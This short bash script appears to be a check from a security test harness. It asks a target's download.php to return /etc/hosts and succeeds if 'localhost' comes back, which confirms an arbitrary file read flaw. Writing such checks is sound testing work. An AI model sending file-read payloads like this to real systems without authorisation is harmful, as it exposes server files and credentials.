#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
curl -s -G --data-urlencode 'file=/etc/hosts' "$TARGET/download.php" | grep -q 'localhost'
